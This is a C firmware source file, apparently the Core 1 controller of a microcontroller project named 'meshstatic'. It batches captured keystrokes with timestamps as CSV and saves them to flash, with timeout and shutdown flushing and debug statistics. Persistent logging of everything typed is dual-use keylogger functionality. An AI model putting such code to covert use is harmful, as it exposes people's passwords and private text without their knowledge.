/**
 * @file meshstatic_core1.c
 * @brief Implementation of Core 1 controller
 *
 * SPDX-License-Identifier: BSD-3-Clause
 */

#include "meshstatic_core1.h"
#include <string.h>
#include <stdio.h>

/* ============================================================================
 * Private State
 * ============================================================================ */

/** Current active batch */
static meshstatic_batch_t g_current_batch;

/** Controller statistics */
static meshstatic_core1_stats_t g_stats;

/** Initialization flag */
static bool g_initialized = false;

/* ============================================================================
 * Private Helper Functions
 * ============================================================================ */

/**
 * @brief Flush current batch to storage and create new batch
 *
 * @return true if flush successful
 */
static bool flush_and_reset(void)
{
    /* Don't flush empty batches */
    if (g_current_batch.meta.count == 0) {
        return false;
    }

    /* Save to storage */
    bool success = meshstatic_storage_save_batch(&g_current_batch);

    if (success) {
        g_stats.batches_saved++;

        #if MESHSTATIC_DEBUG_ENABLED
        printf("[MESHSTATIC] Batch %u saved to flash (%u keystrokes, %u bytes)\n",
               g_current_batch.meta.batch_id,
               g_current_batch.meta.count,
               g_current_batch.meta.csv_length);
        #endif
    } else {
        g_stats.save_errors++;

        #if MESHSTATIC_DEBUG_ENABLED
        printf("[MESHSTATIC] ERROR: Failed to save batch %u\n",
               g_current_batch.meta.batch_id);
        #endif
    }

    /* Reset batch for next collection */
    meshstatic_batch_reset(&g_current_batch);
    g_stats.batches_created++;

    return success;
}

/* ============================================================================
 * Public API Implementation
 * ============================================================================ */

bool meshstatic_core1_init(void)
{
    if (g_initialized) {
        return true;  /* Already initialized */
    }

    /* Initialize statistics */
    memset(&g_stats, 0, sizeof(g_stats));

    /* Initialize storage system */
    meshstatic_storage_init_result_t storage_result = meshstatic_storage_init();

    if (!storage_result.success) {
        #if MESHSTATIC_DEBUG_ENABLED
        printf("[MESHSTATIC] ERROR: Storage init failed: %s\n", storage_result.error_msg);
        #endif
        return false;
    }

    #if MESHSTATIC_DEBUG_ENABLED
    printf("[MESHSTATIC] Storage initialized (recovered %u batches)\n",
           storage_result.recovered_batches);
    #endif

    /* Initialize first batch */
    meshstatic_batch_init(&g_current_batch);
    g_stats.batches_created = 1;
    g_stats.current_batch_id = g_current_batch.meta.batch_id;

    g_initialized = true;

    #if MESHSTATIC_DEBUG_ENABLED
    printf("[MESHSTATIC] Core 1 controller initialized (batch ID: %u)\n",
           g_current_batch.meta.batch_id);
    #endif

    return true;
}

bool meshstatic_core1_add_keystroke(uint8_t scancode,
                                    uint8_t modifier,
                                    char character,
                                    uint32_t timestamp_us)
{
    if (!g_initialized) {
        return false;  /* Not initialized */
    }

    /* Try to add keystroke to current batch */
    bool added = meshstatic_batch_add(&g_current_batch,
                                      scancode,
                                      modifier,
                                      character,
                                      timestamp_us);

    if (added) {
        g_stats.keystrokes_captured++;
        g_stats.current_batch_count = g_current_batch.meta.count;
        g_stats.last_keystroke_us = timestamp_us;

        #if MESHSTATIC_DEBUG_ENABLED
        /* Log every 10 keystrokes */
        if (g_stats.keystrokes_captured % 10 == 0) {
            printf("[MESHSTATIC] %u keystrokes captured (batch %u: %u/%u)\n",
                   g_stats.keystrokes_captured,
                   g_current_batch.meta.batch_id,
                   g_current_batch.meta.count,
                   MESHSTATIC_MAX_KEYSTROKES_PER_BATCH);
        }
        #endif

        /* Check if batch is full */
        if (meshstatic_batch_is_full(&g_current_batch)) {
            #if MESHSTATIC_DEBUG_ENABLED
            printf("[MESHSTATIC] Batch %u full - auto-flushing\n",
                   g_current_batch.meta.batch_id);
            #endif

            flush_and_reset();
        }

        return true;
    } else {
        /* Batch full but wasn't caught by is_full() check */
        /* This shouldn't happen, but handle gracefully */
        #if MESHSTATIC_DEBUG_ENABLED
        printf("[MESHSTATIC] WARNING: Batch add failed, forcing flush\n");
        #endif

        flush_and_reset();

        /* Retry with new batch */
        return meshstatic_batch_add(&g_current_batch,
                                    scancode,
                                    modifier,
                                    character,
                                    timestamp_us);
    }
}

bool meshstatic_core1_flush_batch(void)
{
    if (!g_initialized) {
        return false;
    }

    g_stats.manual_flushes++;

    return flush_and_reset();
}

bool meshstatic_core1_check_auto_flush(uint64_t current_time_us)
{
    if (!g_initialized) {
        return false;
    }

    /* Don't auto-flush empty batches */
    if (g_current_batch.meta.count == 0) {
        return false;
    }

    /* Check timeout */
    uint64_t time_since_last = current_time_us - g_stats.last_keystroke_us;

    if (time_since_last >= MESHSTATIC_AUTO_FLUSH_TIMEOUT_US) {
        #if MESHSTATIC_DEBUG_ENABLED
        printf("[MESHSTATIC] Auto-flush timeout (%llu seconds since last keystroke)\n",
               time_since_last / 1000000);
        #endif

        g_stats.auto_flushes++;
        return flush_and_reset();
    }

    return false;
}

void meshstatic_core1_get_stats(meshstatic_core1_stats_t* stats)
{
    if (!stats) return;

    memcpy(stats, &g_stats, sizeof(meshstatic_core1_stats_t));

    /* Update current batch info */
    stats->current_batch_count = g_current_batch.meta.count;
    stats->current_batch_id = g_current_batch.meta.batch_id;
}

void meshstatic_core1_reset_stats(void)
{
    memset(&g_stats, 0, sizeof(g_stats));

    /* Preserve current batch info */
    g_stats.current_batch_count = g_current_batch.meta.count;
    g_stats.current_batch_id = g_current_batch.meta.batch_id;
    g_stats.batches_created = 1;  /* Current batch */
}

void meshstatic_core1_shutdown(void)
{
    if (!g_initialized) {
        return;
    }

    #if MESHSTATIC_DEBUG_ENABLED
    printf("[MESHSTATIC] Shutting down - flushing final batch\n");
    #endif

    /* Flush any remaining keystrokes */
    flush_and_reset();

    g_initialized = false;
}

const meshstatic_batch_t* meshstatic_core1_get_current_batch(void)
{
    if (!g_initialized) {
        return NULL;
    }

    return &g_current_batch;
}

/* ============================================================================
 * Debug/Testing Helpers
 * ============================================================================ */

#if MESHSTATIC_DEBUG_ENABLED

void meshstatic_core1_print_stats(void)
{
    printf("\n========== MESHSTATIC CORE 1 STATISTICS ==========\n");
    printf("Keystrokes Captured:    %u\n", g_stats.keystrokes_captured);
    printf("Batches Created:        %u\n", g_stats.batches_created);
    printf("Batches Saved:          %u\n", g_stats.batches_saved);
    printf("Save Errors:            %u\n", g_stats.save_errors);
    printf("Auto Flushes:           %u\n", g_stats.auto_flushes);
    printf("Manual Flushes:         %u\n", g_stats.manual_flushes);
    printf("Current Batch ID:       %u\n", g_current_batch.meta.batch_id);
    printf("Current Batch Count:    %u/%u\n",
           g_current_batch.meta.count,
           MESHSTATIC_MAX_KEYSTROKES_PER_BATCH);
    printf("Last Keystroke:         %llu us\n",
           (unsigned long long)g_stats.last_keystroke_us);
    printf("===================================================\n\n");
}

void meshstatic_core1_print_batch_info(void)
{
    printf("\n========== CURRENT BATCH INFO ==========\n");
    printf("Batch ID:      %u\n", g_current_batch.meta.batch_id);
    printf("Keystrokes:    %u/%u\n",
           g_current_batch.meta.count,
           MESHSTATIC_MAX_KEYSTROKES_PER_BATCH);
    printf("CSV Length:    %u/%u bytes\n",
           g_current_batch.meta.csv_length,
           MESHSTATIC_MAX_BATCH_SIZE);
    printf("Needs Flush:   %s\n",
           g_current_batch.meta.needs_flush ? "YES" : "NO");
    printf("Time Range:    %lu - %lu us\n",
           (unsigned long)g_current_batch.meta.start_time_us,
           (unsigned long)g_current_batch.meta.end_time_us);
    printf("========================================\n\n");
}

#endif /* MESHSTATIC_DEBUG_ENABLED */
